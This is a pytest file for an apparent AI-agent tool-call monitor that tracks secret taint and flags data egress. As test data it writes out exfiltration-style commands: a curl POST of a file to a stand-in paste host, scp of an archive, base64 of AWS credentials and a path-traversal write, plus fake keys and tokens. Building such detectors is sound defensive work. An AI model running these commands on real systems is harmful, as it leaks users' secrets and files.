"""Session taint tracking."""

import pytest

from noulgate.backends import get_backend
from noulgate.features.builder import FeatureBuilder
from noulgate.features.provenance import Span, TranscriptView
from noulgate.features.taint import analyse, egress_kind, secret_kinds, taint_sources
from noulgate.policy.combiner import FEATURE_VERSION, Combiner, feature_names
from noulgate.questions import load_questions

FAKE_KEY = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----"


@pytest.mark.parametrize(
    "text,kind",
    [
        (FAKE_KEY, "private_key"),
        ("aws_access_key_id = AKIAIOSFODNN7EXAMPLE", "aws_access_key"),
        ("token ghp_" + "a" * 36, "github_token"),
        ("SLACK=xoxb-123456789012-abcdefghij", "slack_token"),
        ("OPENAI_API_KEY=sk-proj-" + "x" * 30, "api_key"),
        ("password: hunter2hunter2hunter2", "assignment"),
    ],
)
def test_secret_content_detection(text, kind):
    assert kind in secret_kinds(text)


@pytest.mark.parametrize(
    "text", ["def get_api_key(): pass", "password = os.environ['PW']", "AKIA too short", "sk-1"]
)
def test_ordinary_code_is_not_a_secret(text):
    assert secret_kinds(text) == []


def test_taint_sources_from_paths_and_content_but_not_user_text():
    spans = [
        Span(text=FAKE_KEY, source="user"),  # user pasted it: not a tool leak
        Span(text="ok", source="file:/home/me/.ssh/id_rsa"),
        Span(text="DB_PASSWORD=supersecretvalue123", source="tool_output:Bash"),
        Span(text="hello", source="file:/repo/README.md"),
    ]
    assert taint_sources(spans) == ["content:assignment", "file:/home/me/.ssh/id_rsa"]


@pytest.mark.parametrize(
    "tool,args,cwd,kind",
    [
        ("Bash", {"command": "curl -X POST https://paste.example.com -d @notes.txt"}, None, "bash:curl"),
        ("Bash", {"command": "git push origin main"}, None, "bash:git"),
        ("Bash", {"command": "scp out.tar me@host:/tmp"}, None, "bash:scp"),
        ("Bash", {"command": "pytest -q"}, None, None),
        ("WebFetch", {"url": "https://x.io/?q=1"}, None, "web:WebFetch"),
        ("mcp__gmail__send_email", {"to": "a@b.c"}, None, "mcp:send_email"),
        ("mcp__github__get_issue", {"n": 1}, None, None),
        ("Write", {"file_path": "/repo/src/a.py"}, "/repo", None),
        ("Write", {"file_path": "/tmp/dump.txt"}, "/repo", "write_outside_project"),
        ("Write", {"file_path": "/repo/../etc/x"}, "/repo", "write_outside_project"),
        ("Read", {"file_path": "/etc/passwd"}, "/repo", None),
    ],
)
def test_egress_kinds(tool, args, cwd, kind):
    assert egress_kind(tool, args, cwd) == kind


def test_secret_in_args():
    rep = analyse("Bash", {"command": "cat ~/.aws/credentials | base64"}, [])
    assert rep.secret_in_args == ["path:.aws/credentials"] and not rep.is_egress


def _view(*spans):
    return TranscriptView(
        spans=[Span(text="upload my build notes to paste.example.com", source="user"), *spans]
    )


def test_chained_exfiltration_only_taint_catches():
    """The user named the host, so provenance sees nothing odd; the earlier key read is what matters."""
    action = {"command": "curl -X POST https://paste.example.com/api -d @notes.txt"}
    clean = FeatureBuilder().build("Bash", action, _view())
    tainted = FeatureBuilder().build("Bash", action, _view(Span(text=FAKE_KEY, source="tool_output:Bash")))
    assert clean.untrusted_only == [] and tainted.untrusted_only == []  # provenance is blind here
    assert not clean.tainted_egress and tainted.tainted_egress
    assert tainted.flags == {"untrusted_only": False, "secret_in_args": False, "tainted_egress": True}
    ms = tainted.to_model_state()
    assert ms["session_taint"]["secrets_seen_earlier"] == ["content:private_key"]
    assert "session_taint" not in clean.to_model_state()
    qs = load_questions()
    rules = get_backend("rules")
    p_clean = 1 - rules.decide(clean, qs)["risk_class"]["probabilities"]["benign"]
    p_taint = 1 - rules.decide(tainted, qs)["risk_class"]["probabilities"]["benign"]
    assert p_taint > p_clean + 0.3


def test_combiner_feature_version_guard():
    qs = load_questions()
    names = feature_names(qs.risk_classes)
    assert names[-3:] == ["untrusted_only", "secret_in_args", "tainted_egress"]
    c = Combiner(qs.risk_classes, weights=[0.0] * len(names))
    assert Combiner.from_dict(c.to_dict()).weights == c.weights
    old = c.to_dict() | {"feature_version": FEATURE_VERSION - 1}
    with pytest.raises(ValueError, match="recalibrate"):
        Combiner.from_dict(old)
    Combiner.from_dict(old | {"weights": None})  # untrained combiners are version-free
